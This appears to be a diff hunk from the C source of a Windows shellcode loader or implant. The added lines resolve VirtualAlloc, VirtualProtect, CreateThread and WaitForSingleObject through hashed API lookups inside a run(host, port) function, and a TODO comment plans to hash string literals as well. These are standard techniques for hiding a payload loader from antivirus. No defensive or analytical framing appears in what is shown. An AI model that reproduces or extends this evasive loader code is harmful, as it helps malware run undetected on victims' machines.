@@ -43,6 +43,21 @@ int run(const char* host, const char* port)
     */
 
     HMODULE kernel32_module = GetModuleHandleManualHash(KERNEL32_DLL_HASH);
+	FARPROC funcAddresses[4] = {NULL};
+	DWORD hashes[] = {VIRTUALALLOC_HASH, VIRTUALPROTECT_HASH, CREATETHREAD_HASH, WAITFORSINGLEOBJECT_HASH};
+
+	int val = GetProcAddressManualHashes(
+				kernel32_module, 
+				hashes,
+				funcAddresses,
+				4
+				);
+
+	if (val != 0)
+	{
+		printf("error\n");
+		return 1;
+	}
 
 
 	// TODO: hash these string literals 
